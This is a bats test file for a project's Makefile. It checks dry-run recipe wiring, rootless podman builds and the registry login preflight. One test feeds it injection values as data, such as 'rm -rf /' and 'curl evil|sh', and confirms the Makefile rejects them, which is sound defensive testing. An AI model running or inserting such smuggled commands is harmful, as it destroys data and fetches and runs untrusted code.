#!/usr/bin/env bats
# tests/makefile.bats — Static integration tests for the top-level Makefile.
#
# Exercises `make -n` (dry-run) and `make help` so we can verify recipe
# wiring without touching libvirt / podman / sudo. Designed to run in a
# vanilla Ubuntu/Fedora CI runner — no KVM host required.
#
# Coverage:
#   1.  `make help` exits 0 and lists at least 10 targets.
#   2.  `make -n deploy-cluster CONFIG=…` -> bash scripts/deploy-cluster.sh
#   3.  `make -n destroy-cluster CONFIG=…` -> bash scripts/destroy-cluster.sh
#   4.  `make -n update-cluster CONFIG=…` -> bash scripts/update-cluster.sh
#   5.  `make -n verify-all`     -> all three verify-* scripts in sequence
#   6.  `make -n backup-etcd`    -> bash scripts/backup-etcd.sh (no LABEL)
#   7.  `make -n switch-to-ghcr` -> bash scripts/switch-to-ghcr.sh
#   8.  `make -n clean`          -> includes clean-vms (scripts/clean-vms.sh) + clean-images
#   9.  Every `.PHONY:` target is also a defined target (and vice versa).
#   10. Every target referenced from `make -n <t>` actually exists.
#   11. `make image-*` recipes contain no `sudo` (rootless contract, #230).
#   12. `make push-image-k8s` IMAGE_TAG/GHCR_REGISTRY interpolate correctly.
#   13. `make help` lists push-image-{k8s,worker,all}.
#   14. PODMAN_BUILD_OPTS threads STORAGE_DRIVER/PODMAN_ROOT/PODMAN_RUNROOT
#       through every podman invocation when set, and emits zero stray
#       flags between `podman` and the verb when all three are unset.
#   15. `make -n push-image-k8s` includes the prerequisite `podman build`
#       line so a future drop of the `image-k8s` prereq fails this test.
#   16. Shell-metachar attacks on STORAGE_DRIVER / PODMAN_ROOT /
#       PODMAN_RUNROOT / IMAGE_TAG / GHCR_REGISTRY are refused at
#       Makefile parse time, before any recipe runs.
#   17. push-image-{k8s,worker} runs a `podman login --get-login` preflight
#       against the registry host extracted from GHCR_REGISTRY, with a
#       diagnostic that names the host the operator must `podman login` to.
#   18. Cluster-lifecycle recipes (deploy-cluster, destroy-cluster,
#       update-cluster, update-workers, update-node) do NOT prefix `sudo`
#       (issue #233 — sudo moved into the scripts via the SSH wrap).
#   19. docs/makefile.md and docs/deploy-cluster.md mention
#       `--preserve-env` somewhere (drift fence for the local-fallback
#       workaround when running on the KVM host with custom podman
#       storage — issue #233, PR #237 round-2).

setup() {
  # All recipes are anchored at repo root. tests/ lives one level down, so
  # walk up regardless of where bats is invoked from.
  REPO_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
  cd "$REPO_ROOT"
}

# Convenience: dump `make -n <args>` output. Aborts the test on non-zero
# exit so failures point at the dry-run, not a downstream assertion.
make_dry() {
  run make -n "$@"
  [ "$status" -eq 0 ] || {
    echo "make -n $* failed (status=$status):" >&2
    echo "$output" >&2
    return "$status"
  }
}

@test "1. make help exits 0 and lists at least 10 targets" {
  run make -s help
  [ "$status" -eq 0 ]
  # Each documented target prints one line of the form "  <name>  <desc>".
  # Strip ANSI colour codes (esc-[ … m) before counting target rows so the
  # check stays portable across GNU grep flavours that don't understand
  # \x1b escapes in -E patterns.
  target_count="$(printf '%s\n' "$output" \
    | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g' \
    | grep -cE '^[[:space:]]+[a-zA-Z0-9_-]+[[:space:]]+')"
  echo "help listed $target_count targets" >&2
  [ "$target_count" -ge 10 ]
}

@test "2. make -n deploy-cluster CONFIG=… invokes scripts/deploy-cluster.sh" {
  make_dry deploy-cluster CONFIG=cluster.example.conf
  [[ "$output" == *"bash scripts/deploy-cluster.sh"* ]]
  [[ "$output" == *"cluster.example.conf"* ]]
}

@test "3. make -n destroy-cluster CONFIG=… invokes scripts/destroy-cluster.sh" {
  make_dry destroy-cluster CONFIG=cluster.example.conf
  [[ "$output" == *"bash scripts/destroy-cluster.sh"* ]]
}

@test "4. make -n update-cluster CONFIG=… invokes scripts/update-cluster.sh" {
  make_dry update-cluster CONFIG=cluster.example.conf
  [[ "$output" == *"bash scripts/update-cluster.sh"* ]]
}

@test "5. make -n verify-all runs verify-encryption, verify-hardening, verify-app-deploy in sequence" {
  make_dry verify-all
  # Each verify-* script must appear, and in the documented order.
  [[ "$output" == *"bash scripts/verify-encryption.sh"* ]]
  [[ "$output" == *"bash scripts/verify-hardening.sh"* ]]
  [[ "$output" == *"bash scripts/verify-app-deploy.sh"* ]]
  # Sequence check: find line numbers and confirm ordering.
  enc_line=$(printf '%s\n' "$output" | grep -n 'verify-encryption.sh'  | head -1 | cut -d: -f1)
  hard_line=$(printf '%s\n' "$output" | grep -n 'verify-hardening.sh' | head -1 | cut -d: -f1)
  app_line=$(printf '%s\n' "$output" | grep -n 'verify-app-deploy.sh' | head -1 | cut -d: -f1)
  [ "$enc_line" -lt "$hard_line" ]
  [ "$hard_line" -lt "$app_line" ]
}

@test "6. make -n backup-etcd invokes scripts/backup-etcd.sh with no LABEL" {
  make_dry backup-etcd
  [[ "$output" == *"bash scripts/backup-etcd.sh"* ]]
  # Sanity: no LABEL= leakage in the dry-run.
  [[ "$output" != *"LABEL="* ]]
}

@test "7. make -n switch-to-ghcr invokes scripts/switch-to-ghcr.sh" {
  make_dry switch-to-ghcr
  [[ "$output" == *"bash scripts/switch-to-ghcr.sh"* ]]
}

@test "8. make -n clean includes both clean-vms and clean-images recipes" {
  # `clean` depends on clean-vms + clean-images; dry-run should expand both.
  make_dry clean
  # clean-vms recipe: invokes scripts/clean-vms.sh (which sources the C3
  # SSH-wrap shim + sweeps qcow2/seed-ISO stragglers — see #271 F5 + #221).
  [[ "$output" == *"bash scripts/clean-vms.sh"* ]]
  # clean-images recipe: `podman image rm` on the two local images.
  [[ "$output" == *"podman image rm"* ]]
  [[ "$output" == *"localhost/hummingbird-k8s:latest"* ]]
  [[ "$output" == *"localhost/hummingbird-k8s-worker:latest"* ]]
}

@test "9. .PHONY block enumerates every defined target (and vice versa)" {
  # Set A: targets declared on the .PHONY: line (continuation-aware).
  phony="$(sed -n '/^\.PHONY:/,/[^\\]$/p' Makefile \
    | sed 's/\\$//' \
    | tr -d '\n' \
    | sed 's/^\.PHONY://' \
    | tr ' ' '\n' \
    | grep -v '^$' \
    | sort -u)"

  # Set B: all rule heads `name:` in the Makefile (excludes variable
  # assignments `NAME :=`). Filter out colon-prefixed Make specials.
  defined="$(grep -E '^[a-zA-Z0-9_-]+:' Makefile \
    | awk -F: '{print $1}' \
    | grep -v '^\.' \
    | sort -u)"

  # Reflect counts to test output for debugging.
  echo "phony targets:  $(printf '%s\n' "$phony"   | wc -l)" >&2
  echo "defined heads:  $(printf '%s\n' "$defined" | wc -l)" >&2

  # A == B (no defined target missing from .PHONY, no .PHONY entry orphaned).
  diff <(printf '%s\n' "$phony") <(printf '%s\n' "$defined")
}

@test "10. every recipe referenced by make -n exists as a target" {
  # Walk the .PHONY list and ensure `make -n <t>` succeeds for each one.
  # `make -n` on an undefined target prints `*** No rule to make target ...`
  # and exits 2 — i.e. any broken cross-reference fails this test.
  phony="$(sed -n '/^\.PHONY:/,/[^\\]$/p' Makefile \
    | sed 's/\\$//' \
    | tr -d '\n' \
    | sed 's/^\.PHONY://' \
    | tr ' ' '\n' \
    | grep -v '^$')"

  # Targets that require CONFIG=, SNAP=, NODE=, etc. — pass stub values so
  # the dry-run can expand without the guard short-circuiting.
  for t in $phony; do
    case "$t" in
      restore-etcd)
        run make -n "$t" SNAP=/tmp/stub.db ;;
      deploy-cluster|destroy-cluster|update-cluster|update-workers|export-argocd|get-kubeconfig)
        run make -n "$t" CONFIG=cluster.example.conf ;;
      update-node)
        run make -n "$t" CONFIG=cluster.example.conf NODE=stub-node ;;
      kubectl)
        run make -n "$t" ARGS='get nodes' ;;
      *)
        run make -n "$t" ;;
    esac
    if [ "$status" -ne 0 ]; then
      echo "make -n $t failed (status=$status):" >&2
      echo "$output" >&2
      return 1
    fi
  done
}

@test "11. image-* recipes contain no sudo (rootless contract, #230)" {
  # Dry-run every image-* and push-image-* recipe and assert the rendered
  # command lines do not contain `sudo`. Workstation operators must be
  # able to invoke them as a non-root user.
  for t in image-k8s image-worker image-all \
           image-k8s-with-cloud-init image-worker-with-cloud-init \
           push-image-k8s push-image-worker push-image-all; do
    run make -n "$t"
    [ "$status" -eq 0 ] || {
      echo "make -n $t failed (status=$status): $output" >&2
      return 1
    }
    if printf '%s\n' "$output" | grep -qE '(^|[[:space:]])sudo([[:space:]]|$)'; then
      echo "make -n $t contains sudo (must be rootless):" >&2
      echo "$output" >&2
      return 1
    fi
  done
}

@test "12. push-image-k8s interpolates IMAGE_TAG and GHCR_REGISTRY" {
  run make -n push-image-k8s IMAGE_TAG=v9.9.9 GHCR_REGISTRY=ghcr.io/example
  [ "$status" -eq 0 ]
  [[ "$output" == *"podman"* ]]
  [[ "$output" == *"tag"* ]]
  [[ "$output" == *"push"* ]]
  [[ "$output" == *"ghcr.io/example/hummingbird-k8s:v9.9.9"* ]]
  # Default IMAGE_TAG should NOT leak through when overridden.
  [[ "$output" != *"hummingbird-k8s:latest "* ]] || \
    [[ "$output" == *"localhost/hummingbird-k8s:latest"* ]]  # local source tag is fine
}

@test "13. make help lists push-image-{k8s,worker,all}" {
  run make -s help
  [ "$status" -eq 0 ]
  [[ "$output" == *"push-image-k8s"* ]]
  [[ "$output" == *"push-image-worker"* ]]
  [[ "$output" == *"push-image-all"* ]]
}

@test "14. PODMAN_BUILD_OPTS threads storage flags through every podman call, none leak when unset" {
  # All three knobs set: every rendered podman invocation must carry
  # --storage-driver / --root / --runroot between `podman` and the verb.
  run make -n image-k8s STORAGE_DRIVER=overlay PODMAN_ROOT=/tmp/r PODMAN_RUNROOT=/tmp/rr
  [ "$status" -eq 0 ] || { echo "make -n image-k8s (with opts) failed: $output" >&2; return 1; }
  [[ "$output" == *"--storage-driver overlay"* ]]
  [[ "$output" == *"--root /tmp/r"* ]]
  [[ "$output" == *"--runroot /tmp/rr"* ]]
  # And the same on the push path: tag + push must both carry the flags
  # (so podman can find the image the build placed in the alternate root).
  run make -n push-image-k8s STORAGE_DRIVER=overlay PODMAN_ROOT=/tmp/r PODMAN_RUNROOT=/tmp/rr IMAGE_TAG=v1.2.3
  [ "$status" -eq 0 ] || { echo "make -n push-image-k8s (with opts) failed: $output" >&2; return 1; }
  # Every `podman ...` line in the rendered recipe should include all three flags.
  while IFS= read -r line; do
    case "$line" in
      *podman*build*|*podman*tag*|*podman*push*)
        [[ "$line" == *"--storage-driver overlay"* ]] || {
          echo "missing --storage-driver on: $line" >&2; return 1; }
        [[ "$line" == *"--root /tmp/r"* ]] || {
          echo "missing --root on: $line" >&2; return 1; }
        [[ "$line" == *"--runroot /tmp/rr"* ]] || {
          echo "missing --runroot on: $line" >&2; return 1; }
        ;;
    esac
  done <<< "$output"

  # All three unset: no stray flags between `podman` and the verb. We
  # check that no podman line contains --storage-driver / --root /
  # --runroot anywhere — they only appear when the operator opts in.
  run make -n image-k8s
  [ "$status" -eq 0 ]
  if printf '%s\n' "$output" | grep -qE '^[[:space:]]*podman.*(--storage-driver|--root[[:space:]]|--runroot)'; then
    echo "stray storage flags leaked when all three vars unset:" >&2
    echo "$output" >&2
    return 1
  fi
  run make -n push-image-k8s IMAGE_TAG=v1.2.3
  [ "$status" -eq 0 ]
  if printf '%s\n' "$output" | grep -qE '^[[:space:]]*podman.*(--storage-driver|--root[[:space:]]|--runroot)'; then
    echo "stray storage flags leaked on push when all three vars unset:" >&2
    echo "$output" >&2
    return 1
  fi
}

@test "16. Makefile rejects shell-metachar injection in STORAGE_DRIVER/PODMAN_ROOT/PODMAN_RUNROOT/IMAGE_TAG/GHCR_REGISTRY" {
  # Each case: a value containing characters outside the var's
  # allowlist must abort `make -n` with a non-zero status before any
  # recipe runs. We use `make -n help` (cheap, no shell-out) so the
  # error must come from the parse-time $(error) and not from a
  # downstream podman call.
  # NB: the strings here must survive bats's bash word-splitting
  # without command-substitution expansion; we use only metachars
  # bash treats as literal inside single quotes that don't form a
  # `$(...)` / backtick pair after the assignment splits.
  for spec in \
      'STORAGE_DRIVER=overlay --runroot /etc' \
      'PODMAN_ROOT=/tmp/r;rm -rf /' \
      'PODMAN_RUNROOT=`whoami`' \
      'IMAGE_TAG=v1; curl evil|sh' \
      'GHCR_REGISTRY=ghcr.io/x;rm -rf /' ; do
    run make -n help "$spec"
    if [ "$status" -eq 0 ]; then
      echo "make -n help $spec was NOT rejected (status=0):" >&2
      echo "$output" >&2
      return 1
    fi
    # The error message must mention the violating variable's name so
    # the operator knows what to fix.
    var="${spec%%=*}"
    [[ "$output" == *"$var"* ]] || {
      echo "rejection message missing var name '$var':" >&2
      echo "$output" >&2
      return 1
    }
  done

  # And: well-formed values from the documented example MUST still parse.
  run make -n image-k8s STORAGE_DRIVER=overlay PODMAN_ROOT=/tmp/r PODMAN_RUNROOT=/tmp/rr
  [ "$status" -eq 0 ] || { echo "well-formed values rejected: $output" >&2; return 1; }
  run make -n push-image-k8s IMAGE_TAG=v0.1.5 GHCR_REGISTRY=ghcr.io/example
  [ "$status" -eq 0 ] || { echo "well-formed push values rejected: $output" >&2; return 1; }
}

@test "17. push-image-{k8s,worker} preflights podman-login against the registry HOST" {
  # Default registry — should preflight against the bare host ghcr.io
  # (not the full path-prefix ghcr.io/aatchison).
  run make -n push-image-k8s IMAGE_TAG=v0.0.0
  [ "$status" -eq 0 ] || { echo "make -n push-image-k8s: $output" >&2; return 1; }
  [[ "$output" == *"podman login --get-login ghcr.io"* ]]
  # The error message must name the host the operator should `podman login` to.
  [[ "$output" == *"podman login ghcr.io"* ]]

  # And on a fork/mirror override — the host extracted from the path-
  # prefix should change correspondingly.
  run make -n push-image-worker IMAGE_TAG=v0.0.0 GHCR_REGISTRY=quay.io/example
  [ "$status" -eq 0 ] || { echo "make -n push-image-worker: $output" >&2; return 1; }
  [[ "$output" == *"podman login --get-login quay.io"* ]]
  [[ "$output" == *"podman login quay.io"* ]]
}

@test "15. push-image-k8s depends on image-k8s (prereq build line present in dry-run)" {
  # Regression guard: if a future change drops the `image-k8s` prereq
  # from `push-image-k8s` (e.g. as part of an "iterate on tag only"
  # refactor), this test fails — forcing a conscious docs update.
  run make -n push-image-k8s IMAGE_TAG=v1.2.3
  [ "$status" -eq 0 ] || { echo "make -n push-image-k8s failed: $output" >&2; return 1; }
  # The prereq must expand into a real `podman build` line, with the
  # canonical k8s Containerfile path, before the tag/push commands.
  [[ "$output" == *"podman"*"build"*"-t localhost/hummingbird-k8s:latest"*"containers/k8s/Containerfile"* ]]
  build_line=$(printf '%s\n' "$output" | grep -nE 'podman.*build.*containers/k8s/Containerfile' | head -1 | cut -d: -f1)
  tag_line=$(printf '%s\n' "$output"   | grep -nE 'podman.*tag .*hummingbird-k8s'                | head -1 | cut -d: -f1)
  push_line=$(printf '%s\n' "$output"  | grep -nE 'podman.*push .*hummingbird-k8s'               | head -1 | cut -d: -f1)
  [ -n "$build_line" ] && [ -n "$tag_line" ] && [ -n "$push_line" ]
  [ "$build_line" -lt "$tag_line" ]
  [ "$tag_line"   -lt "$push_line" ]
}

@test "18. cluster-lifecycle recipes do not prefix sudo (issue #233)" {
  # Post-#233: the Makefile no longer prefixes `sudo` on the recipes for
  # deploy-cluster/destroy-cluster/update-cluster/update-workers/
  # update-node. Sudo happens inside the scripts via the C3 SSH wrap
  # (scripts/lib/ssh-wrap.sh) — re-exec'd remotely on $KVM_HOST, or
  # probed locally when running on the KVM host directly.
  #
  # The check uses `grep -Ew 'sudo'` so it catches `sudo` anywhere on
  # the line (start-of-line, after a leading env-var prefix like
  # `CONFIG=foo sudo --preserve-env bash …`, etc.) — not just the
  # start-anchored form. If some legitimate future recipe needs to ride
  # a `sudo` along (e.g. a helper that wraps `sudo -E -u <user>`), add
  # an allowlist comment here and grep -v that exact phrase.
  for t in deploy-cluster destroy-cluster update-cluster update-workers; do
    make_dry "$t" CONFIG=cluster.example.conf
    if printf '%s\n' "$output" | grep -Ew 'sudo' >/dev/null; then
      echo "recipe for $t still contains a sudo invocation:" >&2
      echo "$output" >&2
      return 1
    fi
  done
  make_dry update-node CONFIG=cluster.example.conf NODE=stub-node
  if printf '%s\n' "$output" | grep -Ew 'sudo' >/dev/null; then
    echo "recipe for update-node still contains a sudo invocation:" >&2
    echo "$output" >&2
    return 1
  fi
}

@test "19. docs mention --preserve-env workaround for custom podman storage (issue #233)" {
  # Drift fence (M5 from PR #237 round-2): when the Makefile dropped
  # `sudo --preserve-env=…` from the cluster-lifecycle recipes, the
  # operator-facing escape hatch became `sudo --preserve-env=… make
  # deploy-cluster` on the local-fallback path. Both
  # `docs/makefile.md` and `docs/deploy-cluster.md` must document this
  # so the operator workaround doesn't get lost in a future edit.
  for doc in docs/makefile.md docs/deploy-cluster.md; do
    [ -f "$doc" ] || { echo "missing doc: $doc" >&2; return 1; }
    if ! grep -q -- '--preserve-env' "$doc"; then
      echo "$doc no longer mentions --preserve-env (M5 drift fence, #233/#237):" >&2
      echo "  add a note describing 'sudo --preserve-env=STORAGE_DRIVER,...'" >&2
      return 1
    fi
  done
}
